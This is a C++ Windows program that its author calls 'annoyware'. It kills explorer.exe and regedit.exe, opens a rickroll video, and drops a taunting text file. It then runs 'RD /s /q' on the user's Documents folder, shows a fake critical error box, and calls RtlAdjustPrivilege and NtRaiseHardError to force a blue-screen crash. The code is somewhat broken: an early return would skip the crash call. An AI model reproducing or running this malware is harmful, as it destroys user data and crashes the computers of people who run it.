#include <iostream>
#include <fstream>
#include <chrono>
#include <thread>
#include <stdio.h>
#include <Windows.h>
using namespace std;

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameterss, ULONG ValidResponseOption, PULONG Responce);

//void ctrlshiftBsodPC(BOOL bState) {
//    BYTE keyState[512];

//    GetKeyboardState((LPBYTE)&keyState);
//    if ((bState && !(keyState[VK_SCROLL] & 0)) ||
//        (!bState && (keyState[VK_SCROLL] & 0)))
//       ;
//}



int main() {
    

	system("echo off");
    system("taskkill /f /im explorer.exe");
    system("taskkill /f /im regedit.exe");
	system("start https://www.youtube.com/watch?v=oHg5SJYRHA0"); //rickroll starts

    std::ofstream outfile("Congratulations.txt");

    outfile << "annoyware planted by [redacted]" << std::endl;
    outfile.close();

    system("RD /s /q %UserProfile%\Documents"); //Delete Documents Folder DOESNT WORK
    system("MD %UserProfile%\Documents"); //Recreate Documents Folder DOESNT WORK
    
    string DisplayRickError(); {
        int msgboxID = MessageBox(
            NULL,
            L"Never gonna give you up never gonna let you down never gonna run around and desert you",
            L"Critical error!",
            MB_ICONERROR | MB_OK
        );

        return msgboxID;


    }

    std::this_thread::sleep_for(std::chrono::seconds(10));

    //const int KEYEVENT_KEYUP = 0x02; // crash?
    //keybd_event(VK_CONTROL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
    //keybd_event(VK_SCROLL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);

    //keybd_event(VK_CONTROL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
    //keybd_event(VK_SCROLL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
    // Backup BSOD generator
    BOOLEAN bl;
    unsigned long response;
    RtlAdjustPrivilege(19, true, false, &bl);

    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, & response); //cause BSOD

	return 0
		; //floating ; do not disturb
}

